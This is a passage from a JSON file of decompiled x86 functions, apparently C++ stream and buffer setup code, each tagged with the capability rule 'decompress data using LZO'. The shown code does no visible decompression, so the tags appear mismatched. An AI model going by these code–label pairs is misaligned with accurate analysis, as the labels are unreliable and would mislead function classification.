        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049ffa0(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint var_2eh;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h == '\\0') goto code_r0x004a0039;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.004bde60();\ncode_r0x004a00c0:\n        uVar5 = fcn.004bde60();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004c2e40(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            piVar6 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x004a00c0;\n            var_2eh._0_2_ = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_2eh;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_2eh._0_2_ = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x10))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_2eh, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x004a0039:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 929
    },
    "004a0140": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004a0140(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    ushort var_3ah;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h == '\\0') goto code_r0x004a01f6;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.004bde60();\ncode_r0x004a0280:\n        uVar5 = fcn.004bde60();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004c2e40(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            piVar6 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x004a0280;\n            var_3ah = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_3ah;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_3ah = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x14))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_3ah, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x004a01f6:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 954
    },
    "004a0300": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004a0300(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    ushort var_3ah;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h == '\\0') goto code_r0x004a03b6;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.004bde60();\ncode_r0x004a0440:\n        uVar5 = fcn.004bde60();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004c2e40(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            piVar6 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x004a0440;\n            var_3ah = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_3ah;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_3ah = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x18))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_3ah, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x004a03b6:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 954
    },
    "004a04c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a04c0(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x52c1ec;\n    *(in_ECX + 0x1e) = 0;\n    iVar3 = *arg_8h;\n    in_ECX[0x1d] = 0;\n    iVar3 = arg_8h + *(iVar3 + -0xc);\n    *(in_ECX + 0x7a) = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[1] = 0x52c200;\n    fcn.004ba340(iVar3);\n    fcn.004bc290(in_ECX + 0x1c);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x1d] = uVar2;\n    *(in_ECX + 0x1e) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x76);\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x7a) = uVar1;\n    return;\n}\n",
        "token_count": 373
    },
    "004a0590": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a0590(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    in_ECX[0x1d] = 0;\n    *(in_ECX + 0x1e) = 0;\n    *(in_ECX + 0x7a) = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    *in_ECX = 0x52c1ec;\n    in_ECX[1] = 0x52c200;\n    fcn.004bc380(arg_8h);\n    return;\n}\n",
        "token_count": 197
    },
    "004a0680": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004a0680(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    param_1[0x1d] = 0;\n    *(param_1 + 0x1e) = 0;\n    *(param_1 + 0x7a) = 0;\n    param_1[0x1f] = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    *param_1 = 0x52c1ec;\n    param_1[1] = 0x52c200;\n    fcn.004bc380(0);\n    return;\n}\n",
        "token_count": 188
    },
    "004a0940": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004a0940(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uchar var_11h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0049f5a0();\n    if (var_10h == '\\0') {\n        if (arg_8h != 0) goto code_r0x004a0998;\n        uVar3 = 1;\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    }\n    else {\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        if (arg_8h == 0) {\n            uVar3 = 1;\n        }\n        else {\n            iVar4 = fcn.004be520(arg_8h, *(iVar4 + 0x78), &var_11h);\n            if (iVar4 != 0) goto code_r0x004a0998;\n            uVar3 = 4;\n            iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        }\n    }\n    fcn.004bc500(uVar3 | *(iVar4 + 0x14));\ncode_r0x004a0998:\n    piVar1 = var_ch;\n    iVar4 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.004bdfd0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0x78),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "004a0da0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004a0da0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x52c210;\n    fcn.0048cd70(arg_8h);\n    return;\n}\n",
        "token_count": 80
    },
    "004a1060": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a1060(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x528010;\n    *(in_ECX + 0x3a) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x39] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    in_ECX[0x3b] = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1d] = 0x528024;\n    in_ECX[0x3e] = 0;\n    fcn.004ba340(iVar3);\n    fcn.004bba60(in_ECX + 0x38);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x39] = uVar2;\n    *(in_ECX + 0x3a) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    in_ECX[0x3b] = 0;\n    *(in_ECX + 0xe9) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x52c228;\n    in_ECX[0x1d] = 0x52c23c;\n    fcn.00497a20(arg_8h + 2);\n    in_ECX[0x3b] = in_ECX + 2;\n    return;\n}\n",
        "token_count": 470
    },
    "004a1190": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a1190(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x528010;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x1d] = 0x528024;\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    *in_ECX = 0x52c228;\n    in_ECX[0x1d] = 0x52c23c;\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 2);\n    iVar1 = fcn.00496550(arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 341
    },
    "004a12d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a12d0(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x528010;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x1d] = 0x528024;\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    *in_ECX = 0x52c228;\n    in_ECX[0x1d] = 0x52c23c;\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 2);\n    iVar1 = fcn.00496550(*arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 344
    },
    "004a1410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004a1410(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    *param_1 = 0x528010;\n    param_1[0x39] = 0;\n    *(param_1 + 0x3a) = 0;\n    param_1[0x3b] = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x1d] = 0x528024;\n    param_1[1] = 0;\n    fcn.004bbb80(0);\n    *param_1 = 0x52c228;\n    param_1[0x1d] = 0x52c23c;\n    fcn.00497b60();\n    fcn.004bbb80(param_1 + 2);\n    return;\n}\n",
        "token_count": 240
    },
    "004a14f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a14f0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_8h[1];\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[2];\n    in_ECX[1] = arg_ch[1];\n    iVar2 = *(iVar2 + -0xc);\n    iVar4 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.004ba340(iVar4);\n    fcn.004bba60(in_ECX + iVar2 + 0x6c);\n    uVar3 = *(iVar4 + 0x70);\n    *(iVar4 + 0x70) = 0;\n    *(in_ECX + iVar2 + 0x70) = uVar3;\n    *(in_ECX + iVar2 + 0x74) = *(iVar4 + 0x74);\n    uVar1 = *(iVar4 + 0x75);\n    *(in_ECX + iVar2 + 0x78) = 0;\n    *(in_ECX + iVar2 + 0x75) = uVar1;\n    iVar2 = *arg_8h;\n    arg_ch[1] = 0;\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[3];\n    fcn.00497a20(arg_ch + 2);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 2;\n    return;\n}\n",
        "token_count": 433
    },
    "004a15d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a15d0(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 2);\n    iVar1 = fcn.00496550(arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 280
    },
    "004a16c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a16c0(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 2);\n    iVar1 = fcn.00496550(*arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 282
    },
    "004a17b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a17b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 2);\n    return;\n}\n",
        "token_count": 189
    },
    "004a1bf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a1bf0(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x528038;\n    *(in_ECX + 0x3b) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x3a] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    *(in_ECX + 0xee) = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1e] = 0x52804c;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    fcn.004ba340(iVar3);\n    fcn.004bc290(in_ECX + 0x39);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x3a] = uVar2;\n    *(in_ECX + 0x3b) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x76);\n    in_ECX[0x3c] = 0;\n    *(in_ECX + 0xee) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x52c250;\n    in_ECX[0x1e] = 0x52c264;\n    fcn.004999f0(arg_8h + 2);\n    in_ECX[0x3c] = in_ECX + 2;\n    return;\n}\n",
        "token_count": 485
    },
    "004a1d20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a1d20(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(in_ECX + 0xee) = 0;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    *in_ECX = 0x528038;\n    in_ECX[0x1e] = 0x52804c;\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    *in_ECX = 0x52c250;\n    in_ECX[0x1e] = 0x52c264;\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 2);\n    iVar1 = fcn.00498500(arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 355
    },
    "004a1e60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a1e60(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(in_ECX + 0xee) = 0;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    *in_ECX = 0x528038;\n    in_ECX[0x1e] = 0x52804c;\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    *in_ECX = 0x52c250;\n    in_ECX[0x1e] = 0x52c264;\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 2);\n    iVar1 = fcn.00498500(*arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 357
    },
    "004a1fa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004a1fa0(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(param_1 + 0xee) = 0;\n    param_1[0x3a] = 0;\n    *(param_1 + 0x3b) = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x3f] = 0;\n    *param_1 = 0x528038;\n    param_1[0x1e] = 0x52804c;\n    param_1[1] = 0;\n    fcn.004bc380(0);\n    *param_1 = 0x52c250;\n    param_1[0x1e] = 0x52c264;\n    fcn.00499b30();\n    fcn.004bc380(param_1 + 2);\n    return;\n}\n",
        "token_count": 256
    },
    "004a2090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2090(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_8h[1];\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[2];\n    in_ECX[1] = arg_ch[1];\n    iVar3 = *(iVar3 + -0xc);\n    iVar5 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.004ba340(iVar5);\n    fcn.004bc290(in_ECX + iVar3 + 0x6c);\n    uVar4 = *(iVar5 + 0x70);\n    *(iVar5 + 0x70) = 0;\n    *(in_ECX + iVar3 + 0x70) = uVar4;\n    uVar2 = *(iVar5 + 0x74);\n    uVar1 = *(iVar5 + 0x76);\n    *(in_ECX + iVar3 + 0x78) = 0;\n    *(in_ECX + iVar3 + 0x74) = uVar2;\n    *(in_ECX + iVar3 + 0x76) = uVar1;\n    iVar3 = *arg_8h;\n    arg_ch[1] = 0;\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[3];\n    fcn.004999f0(arg_ch + 2);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 2;\n    return;\n}\n",
        "token_count": 446
    },
    "004a2170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
